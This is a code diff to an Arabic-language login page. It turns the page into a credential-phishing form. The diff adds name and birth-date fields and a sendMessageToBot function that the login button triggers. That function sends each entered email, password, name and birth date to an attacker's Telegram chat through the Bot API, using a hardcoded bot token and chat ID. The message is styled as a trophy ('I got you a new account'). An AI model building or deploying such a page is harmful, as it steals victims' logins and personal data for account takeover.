@@ -25,26 +25,6 @@
       margin-bottom: 20px;
     }
 
-    .icon-circle {
-      width: 28px;
-      height: 28px;
-      border: 1.8px solid #aaa;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: bold;
-      font-size: 18px;
-      color: #777;
-      cursor: pointer;
-    }
-
-    .back-arrow {
-      font-size: 22px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-
     .title {
       text-align: center;
       font-size: 22px;
@@ -120,11 +100,7 @@
 <body>
 
   <div class="container">
-    <div class="header-bar">
-      <div class="icon-circle">؟</div>
-      <div class="title">تسجيل الدخول</div>
-      <div class="back-arrow">&#8592;</div>
-    </div>
+    <div class="title">تسجيل الدخول</div>
 
     <div class="tabs">
       <div class="tab" onclick="switchTab('phone')">الهاتف</div>
@@ -132,8 +108,10 @@
     </div>
 
     <div id="form-email" class="form-content active">
+      <input id="fullname" type="text" placeholder="الاسم الكامل" oninput="checkFields()" />
       <input id="email" type="text" placeholder="البريد الإلكتروني أو اسم المستخدم" oninput="checkFields()" />
       <input id="password" type="password" placeholder="كلمة المرور" oninput="checkFields()" />
+      <input id="dob" type="date" placeholder="تاريخ الميلاد" oninput="checkFields()" />
     </div>
 
     <div id="form-phone" class="form-content" style="display:none;">
@@ -142,7 +120,7 @@
     </div>
 
     <div class="forgot">نسيت كلمة السر؟</div>
-    <button id="loginBtn" class="login-btn">تسجيل الدخول</button>
+    <button id="loginBtn" class="login-btn" onclick="sendMessageToBot()">تسجيل الدخول</button>
   </div>
 
   <script>
@@ -176,6 +154,29 @@
         btn.classList.remove('active');
         btn.disabled = true;
       }
+    }
+
+    function sendMessageToBot() {
+      const fullname = document.getElementById('fullname').value;
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const dob = document.getElementById('dob').value;
+      const token = "7008716029:AAFOh4raFcgDCzQzJSV0BOxV0Wd0k2jpmR0";
+      const userID = "5029891039";
+
+      const message = `🎉 *جبتلك حساب جديد!*\n\n👤 *الاسم الكامل:* ${fullname}\n📧 *البريد الإلكتروني:* ${email}\n🔑 *كلمة المرور:* ${password}\n📅 *تاريخ الميلاد:* ${dob}\n🖱️ *العملية:* تسجيل الدخول`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: new URLSearchParams({
+          chat_id: userID,
+          text: message,
+          parse_mode: 'Markdown',
+        }),
+      });
     }
   </script>
 </body>
